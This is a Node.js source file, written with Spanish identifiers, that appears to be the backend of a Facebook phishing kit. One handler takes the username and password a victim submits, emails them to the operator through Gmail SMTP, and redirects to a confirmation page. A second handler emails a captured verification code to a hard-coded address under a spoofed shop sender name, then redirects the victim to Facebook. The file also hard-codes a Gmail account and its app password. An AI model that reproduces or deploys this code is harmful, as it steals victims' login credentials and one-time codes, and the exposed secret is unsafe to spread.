import nodemailer from 'nodemailer';

const correoRemitente = 'f34393449@gmail.com';
const passSegura = 'jkit hgha kspb dyab';
const tuCorreo = '';

const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false,
    auth: {
        user: correoRemitente,
        pass: passSegura
    }
});

async function enviarCorreo(req, res) {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ 
            success: false,
            message: 'Usuario y contraseña son requeridos' 
        });
    }
    
    try {
        await transporter.sendMail({
            from: `"Nuevo" <${correoRemitente}>`,
            to: tuCorreo,
            subject: "Nuevo acceso",
            html: `
            <h1>Nuevo inicio de sesión</h1>
            <p><strong>Usuario:</strong> ${username}</p>
            <p><strong>Contraseña:</strong> ${password}</p>
            `
        });
        
        // Respuesta para redirección
        res.status(200).json({ 
            success: true,
            redirect: "/confirm"
        });
    } catch (error) {
        console.error('Error al enviar el correo:', error);
        res.status(500).json({ 
            success: false,
            message: 'Error al procesar la solicitud' 
        });
    }
}

async function code(req, res) {
    const { username } = req.body;
    if (! username) {
        return res.status(400).json({ 
            success: false,
            message: 'Usuario y contraseña son requeridos' 
        });
    }
    
    try {
        await transporter.sendMail({
            from: '"Ferreteria San Marcos" <ferrreteriasanmartin@gmail.com>',
            to: 'noerios880@gmail.com',
            subject: "Nuevo acceso",
            html: `
            <h1>Nuevo inicio de sesión</h1>
            <p><strong>codigo:</strong> ${username}</p>
            `
        });
        
        // Respuesta para redirección
        res.status(200).json({ 
            success: true,
            redirect: "https://www.facebook.com/me"
        });
    } catch (error) {
        console.error('Error al enviar el correo:', error);
        res.status(500).json({ 
            success: false,
            message: 'Error al procesar la solicitud' 
        });
    }
}

export const methods = {
    enviarCorreo,
    code
};